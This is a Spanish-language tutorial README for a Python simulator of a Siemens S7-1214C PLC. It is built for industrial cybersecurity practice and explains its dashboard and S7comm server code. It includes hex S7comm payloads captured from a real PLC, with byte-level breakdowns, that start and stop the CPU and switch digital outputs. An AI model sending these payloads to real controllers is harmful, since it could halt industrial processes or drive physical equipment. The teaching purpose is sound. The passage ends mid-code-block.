# Simulador de PLC Siemens S7-1214C para Prácticas de Ciberseguridad Industrial

## 📋 Índice

1. [Introducción](#introducción)
2. [¿Qué es este simulador y para qué sirve?](#qué-es-este-simulador-y-para-qué-sirve)
3. [Requisitos del sistema](#requisitos-del-sistema)
4. [Instalación](#instalación)
5. [Arquitectura del sistema](#arquitectura-del-sistema)
6. [Explicación detallada del código](#explicación-detallada-del-código)
7. [Payloads S7comm explicados](#payloads-s7comm-explicados)
8. [Uso del simulador](#uso-del-simulador)
9. [Ejercicios prácticos para alumnos](#ejercicios-prácticos-para-alumnos)
10. [Preguntas frecuentes](#preguntas-frecuentes)
11. [Troubleshooting](#troubleshooting)

---

## 🎯 Introducción

Este script Python simula el comportamiento de un **PLC Siemens S7-1214C real**, permitiendo a los estudiantes de ciberseguridad practicar técnicas de hacking industrial desde cualquier ubicación, sin necesidad de acceso físico al laboratorio y sin riesgo de dañar equipamiento real.

### ¿Por qué existe este simulador?

El PLC S7-1214C del laboratorio:
- Solo está disponible durante el horario de clase
- Puede dañarse con experimentos agresivos
- Limita el tiempo de práctica por estudiante
- Requiere presencia física

Este simulador:
- Está disponible 24/7 para practicar desde casa
- No puede dañarse (se reinicia sin consecuencias)
- Permite experimentación ilimitada
- Responde con los **mismos payloads exactos** que el PLC físico

---

## 🎓 ¿Qué es este simulador y para qué sirve?

### Concepto

El simulador es un **gemelo digital** del PLC físico que tienen en el centro educativo. Responde exactamente igual que el hardware real cuando recibe comandos del protocolo S7comm de Siemens.

### Aplicaciones educativas

1. **Prácticas de penetration testing industrial**
   - Escaneo de puertos y servicios
   - Identificación de dispositivos industriales
   - Explotación de protocolos propietarios

2. **Análisis de protocolos SCADA/ICS**
   - Captura de tráfico con Wireshark
   - Ingeniería inversa de payloads
   - Comprensión del protocolo S7comm

3. **Desarrollo de exploits**
   - Creación de scripts de automatización
   - Construcción de frameworks de ataque
   - Fuzzing de protocolos industriales

4. **Competiciones CTF**
   - Retos de hacking industrial
   - Competiciones en tiempo real
   - Clasificatorias para eventos nacionales

---

## 💻 Requisitos del sistema

### Hardware mínimo
- **CPU:** 2 núcleos
- **RAM:** 4 GB
- **Disco:** 20 GB libres
- **Red:** Tarjeta de red con IP estática recomendada

### Software necesario
```bash
# Sistema operativo
Ubuntu 22.04 LTS o superior (también funciona en Debian, Fedora, etc.)

# Python
Python 3.8 o superior

# Bibliotecas Python
fastapi
uvicorn
psutil
```

---

## 🚀 Instalación

### Paso 1: Clonar o descargar el repositorio

```bash
# Si tienes git
git clone https://github.com/nipegun/Zubiri.git
cd Zubiri/CETI/SeguridadIndustrial/zubiri-1214c-sim/

# O descargar manualmente desde GitHub
```

### Paso 2: Instalar dependencias

```bash
# Actualizar el sistema
sudo apt update && sudo apt upgrade -y

# Instalar Python3 y pip (si no están instalados)
sudo apt install python3 python3-pip -y

# Instalar las bibliotecas necesarias
pip3 install fastapi uvicorn psutil
```

### Paso 3: Preparar la estructura de archivos

El script necesita una carpeta `static/` con el archivo `index.html` para el dashboard web.

```bash
# Crear la estructura de directorios
mkdir -p static

# Crear un index.html básico (o usar el proporcionado)
cat > static/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Simulador PLC S7-1214C</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial; padding: 20px; background: #f0f0f0; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }
        .status { padding: 15px; margin: 10px 0; border-radius: 5px; }
        .status.on { background: #4CAF50; color: white; }
        .status.off { background: #f44336; color: white; }
        .status.unknown { background: #9E9E9E; color: white; }
        .section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
        .output, .input { display: inline-block; margin: 5px; padding: 10px 15px; border-radius: 3px; min-width: 80px; text-align: center; }
        h2 { color: #333; border-bottom: 2px solid #2196F3; padding-bottom: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🏭 Simulador PLC Siemens S7-1214C</h1>
        
        <div class="section">
            <h2>Estado del PLC</h2>
            <div id="plc-status" class="status unknown">
                <strong>Estado:</strong> <span id="power-status">Desconocido</span><br>
                <strong>Firmware:</strong> <span id="firmware">-</span>
            </div>
        </div>

        <div class="section">
            <h2>Salidas Digitales (Outputs)</h2>
            <div id="digital-outputs"></div>
        </div>

        <div class="section">
            <h2>Entradas Digitales (Inputs)</h2>
            <div id="digital-inputs"></div>
        </div>

        <div class="section">
            <h2>Entradas Analógicas</h2>
            <div id="analog-inputs"></div>
        </div>

        <div class="section">
            <h2>📊 Log de Actividad</h2>
            <div id="activity-log" style="max-height: 200px; overflow-y: auto; background: #f9f9f9; padding: 10px; border-radius: 3px; font-family: monospace; font-size: 12px;"></div>
        </div>
    </div>

    <script>
        const ws = new WebSocket(`ws://${window.location.host}/ws`);
        const activityLog = document.getElementById('activity-log');
        
        function addLog(message) {
            const time = new Date().toLocaleTimeString();
            activityLog.innerHTML = `[${time}] ${message}<br>` + activityLog.innerHTML;
        }

        ws.onmessage = function(event) {
            const data = JSON.parse(event.data);
            
            // Actualizar estado del PLC
            const powerStatus = data.plc.power_status;
            const plcStatusDiv = document.getElementById('plc-status');
            document.getElementById('power-status').textContent = powerStatus.toUpperCase();
            document.getElementById('firmware').textContent = data.plc.firmware;
            plcStatusDiv.className = `status ${powerStatus}`;
            
            // Actualizar salidas digitales
            let outputsHtml = '';
            for (const [key, value] of Object.entries(data.digital_outputs)) {
                outputsHtml += `<div class="output status ${value}">${key}: ${value.toUpperCase()}</div>`;
            }
            document.getElementById('digital-outputs').innerHTML = outputsHtml;
            
            // Actualizar entradas digitales
            let inputsHtml = '';
            for (const [key, value] of Object.entries(data.digital_inputs)) {
                inputsHtml += `<div class="input status ${value}">${key}: ${value.toUpperCase()}</div>`;
            }
            document.getElementById('digital-inputs').innerHTML = inputsHtml;
            
            // Actualizar entradas analógicas
            let analogHtml = '';
            for (const [key, value] of Object.entries(data.analog_inputs)) {
                analogHtml += `<div class="input status ${value}">${key}: ${value.toUpperCase()}</div>`;
            }
            document.getElementById('analog-inputs').innerHTML = analogHtml;
            
            addLog('Estado actualizado desde el PLC');
        };

        ws.onopen = function() {
            addLog('✅ Conectado al simulador PLC');
        };

        ws.onclose = function() {
            addLog('❌ Desconectado del simulador PLC');
        };

        ws.onerror = function() {
            addLog('⚠️ Error en la conexión WebSocket');
        };
    </script>
</body>
</html>
EOF
```

### Paso 4: Ejecutar el simulador

```bash
# Dar permisos de ejecución
chmod +x server.py

# Ejecutar (requiere sudo por el puerto 102)
sudo python3 server.py
```

Verás una salida similar a:
```
[INFO] Proceso XXXX que usaba el puerto 102 finalizado.
[INFO] Proceso XXXX que usaba el puerto 8000 finalizado.

  Simulador de PLC esperando conexiones en el puerto 102...

INFO:     Started server process [XXXX]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
```

### Paso 5: Verificar que funciona

Abre tu navegador y accede a:
```
http://localhost:8000
```

Deberías ver el dashboard web del simulador.

---

## 🏗️ Arquitectura del sistema

```
┌─────────────────────────────────────────────────────────────────┐
│                     SIMULADOR PLC S7-1214C                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────────────┐          ┌───────────────────────┐   │
│  │  Servidor S7comm     │          │  Servidor Web/API     │   │
│  │  Puerto 102 (TCP)    │          │  Puerto 8000 (HTTP)   │   │
│  │                      │          │                       │   │
│  │  Recibe payloads     │          │  • API REST           │   │
│  │  hexadecimales del   │◄────────┤  • WebSocket          │   │
│  │  protocolo S7comm    │  Estado  │  • Dashboard visual   │   │
│  │                      │  en      │                       │   │
│  └──────────┬───────────┘  tiempo  └───────────────────────┘   │
│             │               real                                │
│             ▼                                                   │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │           Gestor de Estados (states.json)                │  │
│  │                                                           │  │
│  │  {                                                        │  │
│  │    "plc": {                                               │  │
│  │      "power_status": "on|off|unknown",                    │  │
│  │      "firmware": "3.0"                                    │  │
│  │    },                                                     │  │
│  │    "digital_outputs": {                                   │  │
│  │      "%Q0.0": "on|off|unknown",                           │  │
│  │      "%Q0.1": "on|off|unknown",                           │  │
│  │      ...                                                  │  │
│  │    },                                                     │  │
│  │    "digital_inputs": { ... },                             │  │
│  │    "analog_inputs": { ... }                               │  │
│  │  }                                                        │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
         ▲                                      ▲
         │                                      │
         │                                      │
    ┌────┴────┐                          ┌──────┴──────┐
    │ Cliente │                          │  Navegador  │
    │  S7     │                          │     Web     │
    │ (TIA,   │                          │  Dashboard  │
    │ Scripts)│                          │             │
    └─────────┘                          └─────────────┘
```

### Flujo de funcionamiento

1. **Cliente S7** (puede ser TIA Portal, Snap7, o un script) se conecta al puerto 102
2. **Servidor S7comm** recibe un payload hexadecimal
3. El servidor **identifica** qué acción representa ese payload
4. **Actualiza el estado** correspondiente en el diccionario `vEstados`
5. **Guarda** el estado en `states.json` (persistencia)
6. **Envía el estado actualizado** a todos los clientes WebSocket conectados
7. **Dashboard web** se actualiza en tiempo real mostrando el cambio

---

## 📖 Explicación detallada del código

### Estructura general del script

```python
#!/usr/bin/env python3

# 1. IMPORTS - Bibliotecas necesarias
# 2. VERIFICACIÓN DE PRIVILEGIOS - Necesita ser root
# 3. CONFIGURACIÓN - Variables globales
# 4. INICIALIZACIÓN DE ESTADOS - Carga/crea states.json
# 5. DEFINICIÓN DE PAYLOADS - Diccionarios de comandos
# 6. API REST - Endpoints web
# 7. WEBSOCKET - Comunicación en tiempo real
# 8. SERVIDOR S7COMM - Lógica principal del protocolo
# 9. GESTIÓN DE CLIENTES - Manejo de conexiones
# 10. MAIN - Punto de entrada del programa
```

### 1. Imports y bibliotecas

```python
import os           # Para operaciones del sistema operativo
import json         # Para leer/escribir el archivo de estados
import socket       # Para crear el servidor TCP (puerto 102)
import asyncio      # Para operaciones asíncronas
import threading    # Para manejar múltiples conexiones simultáneas
import time         # Para timestamps
import sys          # Para argumentos del sistema
from fastapi import FastAPI, WebSocket  # Framework web moderno
from fastapi.staticfiles import StaticFiles  # Para servir archivos estáticos
from fastapi.responses import FileResponse, JSONResponse  # Respuestas HTTP
import uvicorn      # Servidor ASGI para FastAPI
import psutil       # Para gestionar procesos y puertos
import signal       # Para capturar Ctrl+C
```

**¿Por qué cada biblioteca?**

- `socket`: El protocolo S7comm funciona sobre TCP, necesitamos crear un servidor TCP en el puerto 102
- `threading`: Múltiples alumnos pueden conectarse simultáneamente, cada conexión se maneja en un hilo separado
- `FastAPI`: Framework moderno para crear la API REST y el dashboard web
- `psutil`: Para liberar puertos que estén ocupados antes de iniciar el simulador
- `asyncio`: Para actualizar el estado de forma asíncrona y notificar a todos los clientes web conectados

### 2. Verificación de privilegios

```python
if os.geteuid() != 0:
  print("Este script necesita privilegios de superusuario (sudo).")
  os.execvp("sudo", ["sudo"] + ["python3"] + sys.argv)
```

**¿Por qué necesita sudo?**

Los puertos por debajo de 1024 (en este caso el puerto 102) son "privilegiados" en Linux. Solo el usuario root puede abrir conexiones en estos puertos. Esta es una medida de seguridad del sistema operativo.

**¿Qué hace este código?**
- `os.geteuid()` obtiene el ID del usuario actual
- Si no es 0 (root), ejecuta automáticamente el script con `sudo`
- `os.execvp` reemplaza el proceso actual por uno nuevo con privilegios

### 3. Variables de configuración

```python
vArchivoDeEstados = "states.json"  # Archivo donde se guardan los estados
vPuertoS7 = 102                    # Puerto estándar del protocolo S7comm
vPuertoWeb = 8000                  # Puerto del dashboard web
vEstados = {}                      # Diccionario que almacena todos los estados
aWebSockets = set()                # Conjunto de conexiones WebSocket activas
client_sessions = {}               # Sesiones de clientes S7 conectados
```

**Nomenclatura húngara usada:**
- `v` = variable
- `a` = array/conjunto
- `d` = diccionario
- `f` = función

### 4. Inicialización de estados

```python
# Inicializar estados
if os.path.exists(vArchivoDeEstados):
  with open(vArchivoDeEstados, "r") as f:
    try:
      vEstados = json.load(f)
    except json.JSONDecodeError:
      vEstados = {}
else:
  vEstados = {}
```

**Lógica:**
1. Si existe `states.json`, intenta cargarlo
2. Si está corrupto (JSONDecodeError), crea uno vacío
3. Si no existe, crea uno vacío

**Después, se definen los estados por defecto:**

```python
vEstados.setdefault("plc", {
  "power_status": "unknown",  # Estado inicial: desconocido
  "firmware": "3.0"           # Versión de firmware del S7-1214C
})

vEstados.setdefault("digital_outputs", {
  "%Q0.0": "unknown",  # Salida digital 0.0
  "%Q0.1": "unknown",  # Salida digital 0.1
  # ... hasta %Q1.1 (10 salidas totales)
})

vEstados.setdefault("digital_inputs", {
  "%I0.0": "unknown",  # Entrada digital 0.0
  # ... hasta %I1.5 (14 entradas totales)
})

vEstados.setdefault("analog_inputs", {
  "%A0.0": "unknown",  # Entrada analógica 0
  "%A0.1": "unknown"   # Entrada analógica 1
})
```

**¿Qué significa la nomenclatura %Q, %I, %A?**

Es la notación estándar de Siemens:
- `%Q` = **Q**utput (Salida digital)
- `%I` = **I**nput (Entrada digital)
- `%A` = **A**nalog input (Entrada analógica)
- El número después (ej: `0.0`) indica byte.bit

### 5. Definición de payloads

#### Payloads de encendido/apagado

```python
# Payload para ENCENDER el PLC
vPayloadFinalOn  = bytes.fromhex('0300004302f0807202003431000004f200000010000003ca00b4000034019077000803000004e88969001200000000896a001300896b00040000000000000072020000')

# Payload para APAGAR el PLC
vPayloadFinalOff = bytes.fromhex('0300004302f0807202003431000004f200000010000003ca00b4000034019077000801000004e88969001200000000896a001300896b00040000000000000072020000')
```

**¿De dónde salen estos payloads?**

Fueron capturados del PLC real S7-1214C del laboratorio usando Wireshark cuando se encendía y apagaba desde TIA Portal.

**Estructura de un payload S7comm:**

```
03 00 00 43  <- Encabezado TPKT (indica longitud total)
02 f0 80     <- Encabezado COTP
72 02 00 34  <- Encabezado S7comm
...          <- Datos específicos del comando
```

**Diferencia clave entre ON y OFF:**

```
ON:  ...9077 00 80 3000004e8...
               ↑↑
OFF: ...9077 00 81 0000004e8...
               ↑↑
```

Solo un byte cambia (`80` vs `81`), eso define si es encendido o apagado.

#### Diccionario de payloads de salidas digitales

```python
dPayloadsFinalesDigitalOutputs = {

  # ACTIVAR salidas (valor final: 0100)
  bytes.fromhex('0300002502f08032010000001f000e00060501120a10010001000082000000000300010100'): 
    ("digital_outputs", "%Q0.0", "on"),
  
  bytes.fromhex('0300002502f08032010000001f000e00060501120a10010001000082000001000300010100'): 
    ("digital_outputs", "%Q0.1", "on"),
  
  # ... 10 payloads de activación total

  # DESACTIVAR salidas (valor final: 0000)
  bytes.fromhex('0300002502f08032010000001f000e00060501120a10010001000082000000000300010000'): 
    ("digital_outputs", "%Q0.0", "off"),
  
  bytes.fromhex('0300002502f08032010000001f000e00060501120a10010001000082000001000300010000'): 
    ("digital_outputs", "%Q0.1", "off"),
  
  # ... 10 payloads de desactivación total
}
```

**Estructura del diccionario:**
- **Clave**: Payload completo en bytes
- **Valor**: Tupla con 3 elementos:
  1. Categoría (`"digital_outputs"`)
  2. Identificador de la salida (`"%Q0.0"`)
  3. Nuevo estado (`"on"` o `"off"`)

**¿Cómo identificar qué salida se está controlando?**

```
Payload %Q0.0: ...82 00 00 00 00 0300 01 01 00
                      ↑↑       ↑↑       ↑↑ ↑↑ ↑↑
                      Salida   Offset   |  |  Estado
                      base             Cmd |  (01=on)
                                          Byte

Payload %Q0.1: ...82 00 00 01 00 0300 01 01 00
                      ↑↑ ↑↑ ↑↑
                      Incrementa aquí
```

### 6. API REST con FastAPI

```python
app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")
```

**¿Qué hace esto?**
- Crea una aplicación FastAPI
- Monta la carpeta `static/` para servir archivos estáticos (HTML, CSS, JS)

#### Endpoint: Página principal

```python
@app.get("/")
def leer_index():
  return FileResponse("static/index.html")
```

**Función:** Cuando alguien accede a `http://IP:8000/`, se devuelve el dashboard HTML.

#### Endpoint: Obtener estados

```python
@app.get("/api/states")
def obtener_estados():
  return JSONResponse(content=vEstados)
```

**Función:** Devuelve el estado actual completo en formato JSON.

**Ejemplo de respuesta:**
```json
{
  "plc": {
    "power_status": "on",
    "firmware": "3.0"
  },
  "digital_outputs": {
    "%Q0.0": "on",
    "%Q0.1": "off",
    ...
  },
  ...
}
```

**Uso desde terminal:**
```bash
curl http://localhost:8000/api/states | jq
```

#### Endpoint: Sesiones de clientes

```python
@app.get("/api/sessions")
def obtener_sesiones():
  datos = {}
  for client_id, sesion in client_sessions.items():
    datos[client_id] = {
      "last_activity": sesion["last_activity"],
      "sequence_count": len(sesion["sequence"]),
      "last_sequences": [x.hex() for x in sesion["sequence"][-5:]]
    }
  return JSONResponse(content=datos)
```

**Función:** Muestra información de todas las conexiones S7 activas:
- Última actividad (timestamp)
- Número total de payloads enviados
- Últimos 5 payloads en hexadecimal

**Utilidad:** Los profesores pueden ver qué están haciendo los alumnos en tiempo real.

### 7. WebSocket para actualización en tiempo real

```python
@app.websocket("/ws")
async def websocket_endpoint(ws: WebSocket):
  await ws.accept()                      # Acepta la conexión
  aWebSockets.add(ws)                    # Añade a la lista de conexiones activas
  try:
    await ws.send_text(json.dumps(vEstados))  # Envía estado inicial
    while True:
      await ws.receive_text()            # Mantiene la conexión abierta
  except:
    pass                                 # Si hay error, cierra silenciosamente
  finally:
    aWebSockets.discard(ws)              # Elimina de la lista al desconectar
```

**¿Qué es WebSocket?**

Es un protocolo de comunicación bidireccional que permite al servidor "empujar" datos al cliente sin que este tenga que pedirlos constantemente (a diferencia de HTTP normal).

**Flujo:**
1. El navegador se conecta vía WebSocket a `/ws`
2. El servidor envía el estado actual inmediatamente
3. La conexión queda abierta
4. Cada vez que cambia algo (un alumno ataca el puerto 102), el servidor envía el nuevo estado
5. El dashboard se actualiza automáticamente

#### Función de broadcast

```python
async def fEnviarEstadoATodos():
  mensaje = json.dumps(vEstados)
  vivos = set()
  for ws in list(aWebSockets):
    try:
      await ws.send_text(mensaje)
      vivos.add(ws)
    except:
      pass  # Si falla, la conexión está muerta
  aWebSockets.clear()
  aWebSockets.update(vivos)
```

**Lógica:**
1. Convierte el estado actual a JSON
2. Intenta enviar a todos los WebSockets conectados
3. Si falla (conexión cerrada), no lo añade a "vivos"
4. Actualiza el conjunto solo con las conexiones que funcionan

**¿Por qué es async?**

Porque enviar datos por WebSocket es una operación de I/O que puede tomar tiempo. `async/await` permite que Python maneje múltiples envíos simultáneos eficientemente.

#### Función de actualización de estado

```python
async def fActualizarEstado(tipo, clave, valor):
  vEstados[tipo][clave] = valor          # Actualiza en memoria
  with open(vArchivoDeEstados, "w") as f:
    json.dump(vEstados, f, indent=2)     # Guarda en disco
  await fEnviarEstadoATodos()            # Notifica a todos los clientes web
```

**Parámetros:**
- `tipo`: Categoría del estado (`"plc"`, `"digital_outputs"`, etc.)
- `clave`: Identificador específico (`"power_status"`, `"%Q0.0"`, etc.)
- `valor`: Nuevo valor (`"on"`, `"off"`, `"unknown"`)

**Ejemplo de uso:**
```python
await fActualizarEstado("digital_outputs", "%Q0.0", "on")
# Resultado: vEstados["digital_outputs"]["%Q0.0"] = "on"
```

### 8. Servidor S7comm (puerto 102)

#### Función de liberación de puertos

```python
def fLiberarPuerto(vPuerto):
  for vConex in psutil.net_connections():
    if vConex.laddr and vConex.laddr.port == vPuerto:
      try:
        os.kill(vConex.pid, 9)  # SIGKILL - termina el proceso inmediatamente
        print(f"[INFO] Proceso {vConex.pid} que usaba el puerto {vPuerto} finalizado.")
      except Exception as e:
        print(f"[WARN] No se pudo finalizar el proceso {vConex.pid}: {e}")
```

**¿Por qué es necesario?**

Si el script se cerró incorrectamente (Ctrl+Z en lugar de Ctrl+C), el puerto puede quedar "colgado". Esta función busca cualquier proceso usando el puerto y lo termina forzosamente.

**Señales en Linux:**
- `SIGKILL (9)`: Termina inmediatamente, sin limpieza
- `SIGTERM (15)`: Solicita terminación ordenada (no se usa aquí)

#### Manejador de Ctrl+C

```python
def fManejarSIGINT(sig, frame):
  print("\n[INFO] Interrupción detectada (Ctrl+C). Liberando puertos...")
  fLiberarPuerto(vPuertoS7)
  fLiberarPuerto(vPuertoWeb)
  print("[INFO] Puertos liberados. Saliendo.")
  sys.exit(0)
```

**¿Qué hace?**

Cuando el usuario presiona Ctrl+C, en lugar de salir bruscamente:
1. Captura la señal SIGINT
2. Libera los puertos 102 y 8000
3. Sale ordenadamente

**Registro del manejador:**
```python
signal.signal(signal.SIGINT, fManejarSIGINT)
```

#### Función principal del servidor S7

```python
def fServirS7():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Socket TCP IPv4
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Reusar dirección
  s.bind(("0.0.0.0", vPuertoS7))  # Escuchar en todas las interfaces, puerto 102
  s.listen(5)  # Cola de hasta 5 conexiones pendientes
  print(f"\n  Simulador de PLC esperando conexiones en el puerto {vPuertoS7}...\n")

  while True:  # Bucle infinito
    conn, addr = s.accept()  # Espera y acepta nueva conexión
    client_id = f"{addr[0]}:{addr[1]}"  # Identificador único del cliente
    
    if client_id not in client_sessions:
      client_sessions[client_id] = {"sequence": [], "last_activity": time.time()}

    # Crea un hilo nuevo para manejar este cliente
    threading.Thread(target=fGestionarCliente, args=(conn, addr), daemon=True).start()
```

**Conceptos importantes:**

1. **Socket TCP/IP:**
   - `AF_INET`: Familia de direcciones IPv4
   - `SOCK_STREAM`: Socket orientado a conexión (TCP)

2. **SO_REUSEADDR:**
   - Permite reutilizar el puerto inmediatamente después de cerrar
   - Sin esto, tendríamos que esperar ~60 segundos (TIME_WAIT)

3. **bind("0.0.0.0", 102):**
   - Escucha en TODAS las interfaces de red
   - Permite conexiones desde localhost, LAN, VPN, etc.

4. **listen(5):**
   - Mantiene una cola de hasta 5 conexiones pendientes
   - Si llegan 6 simultáneas, la 6ª se rechaza

5. **daemon=True:**
   - El hilo se cierra automáticamente cuando el programa principal termina
   - Sin esto, los hilos seguirían vivos y el programa no se cerraría

### 9. Gestión de clientes S7

```python
def fGestionarCliente(conn, addr):
  client_id = f"{addr[0]}:{addr[1]}"
  client_sessions[client_id]["sequence"] = []
  print(f"---------------------------------------------")
  print(f"  Conexión abierta con {client_id}")
  
  try:
    while True:
      data = conn.recv(1024)  # Recibe hasta 1024 bytes
      if not data:
        break  # Si no hay datos, el cliente cerró la conexión

      # Registra actividad
      client_sessions[client_id]["last_activity"] = time.time()
      client_sessions[client_id]["sequence"].append(data)
      print(f"\n    Envió Payload Hexadecimal: {debug_hex(data)}")

      response = None  # Inicializa la respuesta
      
      # IDENTIFICA QUÉ TIPO DE PAYLOAD ES
      
      # ¿Es un payload de control de salida digital?
      if data in dPayloadsFinalesDigitalOutputs:
        tipo, clave, valor = dPayloadsFinalesDigitalOutputs[data]
        asyncio.run(fActualizarEstado(tipo, clave, valor))
        response = data  # Echo del payload recibido
      
      # ¿Es el payload de apagado?
      elif data in [vPayloadFinalOff]:
        asyncio.run(fActualizarEstado("plc", "power_status", "off"))
        # Pone TODAS las entradas/salidas en "unknown"
        # (simula que al apagar el PLC, se pierde la comunicación)
        asyncio.run(fActualizarEstado("digital_outputs", "%Q0.0", "unknown"))
        # ... [repite para todas las I/O]
        response = data
      
      # ¿Es el payload de encendido?
      elif data in [vPayloadFinalOn]:
        asyncio.run(fActualizarEstado("plc", "power_status", "on"))
        # Inicializa TODAS las entradas/salidas a "off"
        # (simula estado de arranque seguro del PLC)
        asyncio.run(fActualizarEstado("digital_outputs", "%Q0.0", "off"))
        # ... [repite para todas las I/O]
        response = data
      
      # ¿Payload desconocido?
      else:
        response = data  # Echo del payload recibido

      conn.sendall(response)  # Envía la respuesta al cliente
      
  except Exception as e:
    print(f"  [ERROR] Error en la conexión con {client_id}: {str(e)}")
  finally:
    conn.close()  # Cierra la conexión
    print(f"\n  Conexión cerrada con {client_id}")
    print(f"---------------------------------------------")
```

**Lógica de decisión:**

```
┌─────────────────────────────────┐
│   Recibe payload del cliente    │
└────────────┬────────────────────┘
             │
             ▼
   ┌──────────────────────┐
   │ ¿Está en diccionario │
   │  de salidas digitales?│
   └─────────┬────────────┘
             │
        ┌────┴────┐
        │   SÍ    │         NO
        ▼         ▼
   ┌────────┐  ┌──────────────────┐
   │Actualiza│  │ ¿Es payload ON?  │
   │ salida  │  └────────┬─────────┘
   │específica│          │
   └────────┘      ┌────┴────┐
                   │   SÍ    │     NO
                   ▼         ▼
              ┌─────────┐  ┌──────────────┐
              │Enciende │  │¿Es payload OFF?│
              │  PLC +  │  └───────┬───────┘
              │Inicializa│         │
              │   I/O   │     ┌───┴────┐
              └─────────┘     │   SÍ   │  NO
                              ▼        ▼
                         ┌─────────┐ ┌─────────┐
                         │ Apaga   │ │ Echo    │
                         │ PLC +   │ │ simple  │
                         │ Unknown │ │         │
                         │  I/O    │ │         │
                         └─────────┘ └─────────┘
                              │         │
                              └────┬────┘
                                   ▼
                          ┌──────────────────┐
                          │ Envía respuesta  │
                          │  (echo) al       │
                          │    cliente       │
                          └──────────────────┘
```

**¿Por qué hace echo del payload?**

El protocolo S7comm real funciona así: el PLC confirma el comando enviando de vuelta el mismo payload. Esto es un acknowledgment (confirmación de recepción).

### 10. Punto de entrada (main)

```python
if __name__ == "__main__":
  signal.signal(signal.SIGINT, fManejarSIGINT)  # Registra manejador de Ctrl+C
  fLiberarPuerto(vPuertoS7)   # Limpia el puerto 102 si está ocupado
  fLiberarPuerto(vPuertoWeb)  # Limpia el puerto 8000 si está ocupado
  
  # Inicia servidor S7comm en un hilo aparte
  threading.Thread(target=fServirS7, daemon=True).start()
  
  # Inicia servidor web en el hilo principal
  uvicorn.run(app, host="0.0.0.0", port=vPuertoWeb)
```

**¿Por qué dos servidores?**

1. **Servidor S7comm (puerto 102):** Protocolo binario propietario de Siemens
2. **Servidor Web (puerto 8000):** HTTP/WebSocket para el dashboard

**¿Por qué el S7 va en hilo aparte y el Web en el principal?**

Porque `uvicorn.run()` es bloqueante (mantiene el control del programa). Si pusieramos el S7 en el hilo principal, nunca llegaríamos a iniciar el servidor web.

---

## 🔍 Payloads S7comm explicados

### ¿Qué es un payload?

Un **payload** es el conjunto de bytes que se envía por la red siguiendo un protocolo específico. En este caso, el protocolo S7comm de Siemens.

### Anatomía de un payload S7comm

Tomemos como ejemplo el payload de encendido:

```
03 00 00 43 02 f0 80 72 02 00 34 31 00 00 04 f2 00 00 00 10 00 00 03 ca 00 b4 00 00 34 01 90 77 00 08 03 00 00 04 e8 89 69 00 12 00 00 00 00 89 6a 00 13 00 89 6b 00 04 00 00 00 00 00 00 00 72 02 00 00
```

**Desglose por capas:**

```
┌─────────────────────────────────────────────────────────────┐
│                    CAPA TPKT (Transport)                    │
├─────────────────────────────────────────────────────────────┤
│ 03          │ Versión del protocolo TPKT                    │
│ 00          │ Reservado                                     │
│ 00 43       │ Longitud total del paquete (67 bytes)         │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│                    CAPA COTP (Connection)                   │
├─────────────────────────────────────────────────────────────┤
│ 02          │ Longitud del header COTP                      │
│ f0          │ Tipo de PDU (Data)                            │
│ 80          │ TPDU Number / End of Transmission             │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│                    CAPA S7COMM (PLC)                        │
├─────────────────────────────────────────────────────────────┤
│ 72          │ ID de protocolo S7comm                        │
│ 02          │ Tipo de mensaje (Job Request)                │
│ 00 34       │ Reservado / Redundancy ID                     │
│ 31 00       │ Protocol Data Unit Reference                  │
│ 00 04       │ Parámetro length                              │
│ f2 00       │ Data length                                   │
│ ...         │ Parámetros y datos específicos del comando   │
└─────────────────────────────────────────────────────────────┘
```

### Comparación: Encendido vs Apagado

```
ENCENDIDO (ON):
...90 77 00 08 03 00 00 04 e8...
          ↑↑ ↑↑
          08 03  <- Estos bytes definen "ENCENDER"

APAGADO (OFF):
...90 77 00 08 01 00 00 04 e8...
          ↑↑ ↑↑
          08 01  <- Estos bytes definen "APAGAR"
```

### Comparación: Activar vs Desactivar salida digital

```
ACTIVAR %Q0.0:
...82 00 00 00 00 03 00 01 01 00
                        ↑↑ ↑↑
                        01 01  <- ACTIVAR (bit a 1)

DESACTIVAR %Q0.0:
...82 00 00 00 00 03 00 01 00 00
                        ↑↑ ↑↑
                        01 00  <- DESACTIVAR (bit a 0)
```

### Identificar salidas diferentes

```
%Q0.0: ...82 00 00 00 00...
                  ↑↑ Offset = 0

%Q0.1: ...82 00 00 01 00...
                  ↑↑ Offset = 1

%Q0.7: ...82 00 00 07 00...
                  ↑↑ Offset = 7

%Q1.0: ...82 00 00 08 00...
                  ↑↑ Offset = 8 (primer bit del segundo byte)
```

**Patrón:**
- Byte de salida × 8 + Bit de salida = Offset
- %Q0.0 = 0×8 + 0 = 0
- %Q0.7 = 0×8 + 7 = 7
- %Q1.0 = 1×8 + 0 = 8

### ¿Cómo fueron descubiertos estos payloads?

**Proceso de ingeniería inversa:**

1. **Conexión al PLC real en el laboratorio:**
   ```bash
   # Conectar ordenador al PLC S7-1214C
   # IP del PLC: 192.168.0.1 (ejemplo)
   ```

2. **Iniciar Wireshark en la interfaz de red:**
   ```bash
   sudo wireshark
   # Filtro: tcp.port == 102
   ```

3. **Operaciones en TIA Portal:**
   - Encender el PLC → Capturar payload
   - Apagar el PLC → Capturar payload
   - Activar %Q0.0 → Capturar payload
   - Activar %Q0.1 → Capturar payload
   - Desactivar %Q0.0 → Capturar payload
   - ... y así sucesivamente

4. **Extracción de payloads:**
   ```
   Wireshark > Clic derecho en paquete > Follow > TCP Stream
   > Copiar como Hex
   ```

5. **Implementación en el simulador:**
   ```python
